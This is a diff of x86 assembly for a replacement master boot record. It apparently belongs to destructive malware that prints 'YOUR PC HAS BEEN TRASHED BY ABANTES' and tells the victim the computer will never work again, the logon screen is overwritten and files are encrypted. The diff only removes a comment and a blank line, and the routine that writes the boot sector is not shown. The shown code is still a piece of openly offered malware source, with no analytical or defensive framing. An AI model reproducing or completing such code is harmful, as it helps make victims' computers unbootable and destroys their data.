@@ -1,4 +1,4 @@
-;this isn't my code, I'm not good with assembly I got this online
+
 
 BITS    16
 ORG     0x7c00
@@ -40,6 +40,6 @@ clear_screen:
         int 0x10
         ret
    
-msg:            db        "YOUR PC HAS BEEN TRASHED BY ABANTES",13,10," ",13,10,"This PC is dead because you didn't follow the rules",13,10,"You're PC will never work again",13,10," ",13,10," ",13,10," ",13,10,"NOTE:",13,10,"Even if you fix the MBR your PC is still infected",13,10,"Logon UI is overwritten and your files are encrypted.",13,10," ",13,10,"This was a collaboration check out our discords:",13,10,"Chris#0538 and ElektroKill#8432", 0
+msg:            db        "YOUR PC HAS BEEN TRASHED BY ABANTES",13,10,"This PC is dead because you didn't follow the rules",13,10,"You're PC will never work again",13,10," ",13,10," ",13,10," ",13,10,"NOTE:",13,10,"Even if you fix the MBR your PC is still infected",13,10,"Logon UI is overwritten and your files are encrypted.",13,10," ",13,10,"This was a collaboration check out our discords:",13,10,"Chris#0538 and ElektroKill#8432", 0
 times 510 - ($-$$) db 0
 dw        0xaa55
